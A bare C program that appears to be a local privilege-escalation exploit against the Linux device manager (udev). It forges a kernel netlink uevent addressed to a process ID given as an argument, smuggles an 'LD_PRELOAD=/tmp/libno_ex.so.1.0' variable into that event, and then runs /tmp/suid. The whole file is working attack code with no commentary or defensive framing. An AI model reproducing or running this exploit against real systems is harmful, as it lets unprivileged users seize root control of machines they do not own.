#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sysexits.h>
#include <wait.h>
#include <signal.h>
#include <sys/socket.h>
#include <linux/types.h>
#include <linux/netlink.h>

#ifndef NETLINK_KOBJECT_UEVENT
#define NETLINK_KOBJECT_UEVENT 15
#endif

#define SHORT_STRING 64
#define MEDIUM_STRING 128
#define BIG_STRING 256
#define LONG_STRING 1024
#define EXTRALONG_STRING 4096
#define TRUE 1
#define FALSE 0

int socket_fd;
struct sockaddr_nl address;
struct msghdr msg;
struct iovec iovector;
int sz = 64*1024;

main(int argc, char **argv) {
        char sysfspath[SHORT_STRING];
        char subsystem[SHORT_STRING];
        char event[SHORT_STRING];
        char major[SHORT_STRING];
        char minor[SHORT_STRING];

        sprintf(event, "add");
        sprintf(subsystem, "block");
        sprintf(sysfspath, "/dev/foo");
        sprintf(major, "8");
        sprintf(minor, "1");

        memset(&address, 0, sizeof(address));
        address.nl_family = AF_NETLINK;
        address.nl_pid = atoi(argv[1]);
        address.nl_groups = 0;

        msg.msg_name = (void*)&address;
        msg.msg_namelen = sizeof(address);
        msg.msg_iov = &iovector;
        msg.msg_iovlen = 1;

        socket_fd = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
        bind(socket_fd, (struct sockaddr *) &address, sizeof(address));

        char message[LONG_STRING];
        char *mp;

        mp = message;
        mp += sprintf(mp, "%s@%s", event, sysfspath) +1;
        mp += sprintf(mp, "ACTION=%s", event) +1;
        mp += sprintf(mp, "DEVPATH=%s", sysfspath) +1;
        mp += sprintf(mp, "MAJOR=%s", major) +1;
        mp += sprintf(mp, "MINOR=%s", minor) +1;
        mp += sprintf(mp, "SUBSYSTEM=%s", subsystem) +1;
        mp += sprintf(mp, "LD_PRELOAD=/tmp/libno_ex.so.1.0") +1;

        iovector.iov_base = (void*)message;
        iovector.iov_len = (int)(mp-message);

        char *buf;
        int buflen;
        buf = (char *) &msg;
        buflen = (int)(mp-message);

        sendmsg(socket_fd, &msg, 0);

        close(socket_fd);

	sleep(10);
	execl("/tmp/suid", "suid", (void*)0);
}
